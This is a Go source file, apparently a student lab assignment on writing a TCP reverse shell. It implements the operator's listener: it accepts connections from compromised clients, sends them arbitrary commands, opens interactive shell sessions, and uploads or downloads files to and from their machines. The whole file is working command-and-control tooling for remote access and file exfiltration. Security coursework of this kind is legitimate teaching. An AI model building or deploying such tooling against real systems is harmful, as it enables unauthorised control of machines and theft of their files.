// Name: Justin Shultz
// ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
// Lab: Write a TCP reverse-shell as a Windows executable
//
// Description: This Go program implements a TCP server that listens for
// incoming connections from clients. When a client connects, the server allows
// the operator to interact with the client by sending commands. It supports
// executing arbitrary commands on the client, initiating shell sessions, and
// performing file uploads and downloads.

package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

// Client represents a connected client with its connection and I/O buffers
type Client struct {
	Conn   net.Conn
	Reader *bufio.Reader
	Writer *bufio.Writer
}

func main() {
	var ipAddress string
	var port string

	// Command-line flags for IP address and port
	flag.StringVar(&ipAddress, "a", "0.0.0.0", "IP address the listener should bind to.")
	flag.StringVar(&port, "p", "4444", "Specifies the port the listener should use.")
	flag.Parse()

	// Start TCP listener on the specified IP address and port
	address := fmt.Sprintf("%s:%s", ipAddress, port)
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatalln("Error starting TCP listener:", err)
	}
	defer listener.Close()
	log.Println("Listening on", address)

	for {
		// Accept incoming client connections
		conn, err := listener.Accept()
		if err != nil {
			log.Println("Error accepting connection:", err)
			continue
		}

		// Create a new client instance
		client := &Client{
			Conn:   conn,
			Reader: bufio.NewReader(conn),
			Writer: bufio.NewWriter(conn),
		}

		log.Printf("Client connected from %s", conn.RemoteAddr())

		// Handle the client interaction in a new goroutine
		go handleClient(client)
	}
}

// handleClient manages communication with a connected client
func handleClient(client *Client) {
	defer func() {
		client.Conn.Close()
		log.Printf("Client disconnected")
	}()

	reader := bufio.NewReader(os.Stdin)

	for {
		// Prompt for a command
		fmt.Print("Session> ")
		input, err := reader.ReadString('\n')
		if err != nil {
			log.Println("Error reading from stdin:", err)
			return
		}
		input = strings.TrimSpace(input)

		if input == "" {
			// Empty input, discard and continue
			continue
		} else if input == "exit" {
			// Exit the server program
			fmt.Println("Exiting server.")
			os.Exit(0)
		}

		// Handle special commands
		if input == "shell" {
			// Send the 'shell' command to the client
			_, err = client.Writer.WriteString(input + "\n")
			if err != nil {
				log.Println("Error sending command to client:", err)
				return
			}
			client.Writer.Flush()

			// Start shell session
			handleShell(client)
			// Since the client will disconnect after the shell, we return
			return
		} else if strings.HasPrefix(input, "upload ") || strings.HasPrefix(input, "download ") {
			// File transfer commands are handled within their respective functions
			handleFileTransfer(client, input)
		} else {
			// Send the command to the client
			_, err = client.Writer.WriteString(input + "\n")
			if err != nil {
				log.Println("Error sending command to client:", err)
				return
			}
			client.Writer.Flush()

			// For arbitrary commands, read the response from the client
			response, err := client.Reader.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					log.Println("Client disconnected")
					return
				}
				log.Println("Error reading response from client:", err)
				continue
			}
			// Print the client's response
			fmt.Print(response)
		}
	}
}

// handleShell establishes an interactive shell session with the client
func handleShell(client *Client) {
	log.Println("Starting shell session with client")
	defer log.Println("Shell session with client ended")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	// Copy data from client to server's stdout
	go func() {
		io.Copy(os.Stdout, client.Conn)
		cancel()
	}()
	// Copy data from server's stdin to client
	go func() {
		io.Copy(client.Conn, os.Stdin)
		cancel()
	}()

	// Wait until the shell session is over
	<-ctx.Done()
}

// handleFileTransfer manages file upload and download commands
func handleFileTransfer(client *Client, input string) {
	commandParts := strings.SplitN(input, " ", 2)
	if len(commandParts) < 2 {
		fmt.Println("Invalid command format. Usage:")
		fmt.Println("  upload <local-file-path> <remote-file-path>")
		fmt.Println("  download <remote-file-path> <local-file-path>")
		return
	}

	command := commandParts[0]
	args := commandParts[1]

	if command == "upload" || command == "download" {
		argParts := strings.SplitN(args, " ", 2)
		if len(argParts) < 2 {
			fmt.Println("Invalid command format. Usage:")
			fmt.Println("  upload <local-file-path> <remote-file-path>")
			fmt.Println("  download <remote-file-path> <local-file-path>")
			return
		}

		path1 := strings.TrimSpace(argParts[0])
		path2 := strings.TrimSpace(argParts[1])

		if command == "upload" {
			localPath := path1
			remotePath := path2
			err := handleUpload(client, localPath, remotePath)
			if err != nil {
				log.Println("Upload error:", err)
			} else {
				log.Println("File upload to client completed.")
			}
		} else if command == "download" {
			remotePath := path1
			localPath := path2
			err := handleDownload(client, remotePath, localPath)
			if err != nil {
				log.Println("Download error:", err)
			} else {
				log.Println("File download from client completed.")
			}
		}
	}
}

// handleUpload sends a file from the server to the client
func handleUpload(client *Client, localFilePath, remoteFilePath string) error {
	// Open the local file for reading
	file, err := os.Open(localFilePath)
	if err != nil {
		return fmt.Errorf("error opening local file: %v", err)
	}
	defer file.Close()

	// Get the file size
	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("error getting file info: %v", err)
	}
	fileSize := fileInfo.Size()

	// Send the upload command to the client with file size
	command := fmt.Sprintf("upload %s %d\n", remoteFilePath, fileSize)
	_, err = client.Writer.WriteString(command)
	if err != nil {
		return fmt.Errorf("error sending upload command: %v", err)
	}
	client.Writer.Flush()

	// Send the file content to the client using the buffered writer
	_, err = io.Copy(client.Writer, file)
	if err != nil {
		return fmt.Errorf("error sending file: %v", err)
	}
	client.Writer.Flush()

	return nil
}

// handleDownload receives a file from the client
func handleDownload(client *Client, remoteFilePath, localFilePath string) error {
	// Send the download command to the client
	command := fmt.Sprintf("download %s\n", remoteFilePath)
	fmt.Printf("Sending command to client: %q\n", command) // Debug statement
	_, err := client.Writer.WriteString(command)
	if err != nil {
		return fmt.Errorf("error sending download command: %v", err)
	}
	client.Writer.Flush()

	// Receive the file size from the client
	sizeStr, err := client.Reader.ReadString('\n')
	if err != nil {
		return fmt.Errorf("error reading file size from client: %v", err)
	}
	sizeStr = strings.TrimSpace(sizeStr)
	fileSize, err := strconv.ParseInt(sizeStr, 10, 64)
	if err != nil || fileSize <= 0 {
		return fmt.Errorf("invalid file size received from client: %s", sizeStr)
	}

	// Create the local file to save the received data
	file, err := os.Create(localFilePath)
	if err != nil {
		return fmt.Errorf("error creating local file: %v", err)
	}
	defer file.Close()

	// Receive the file content from the client using the buffered reader
	_, err = io.CopyN(file, client.Reader, fileSize)
	if err != nil {
		return fmt.Errorf("error receiving file from client: %v", err)
	}

	return nil
}
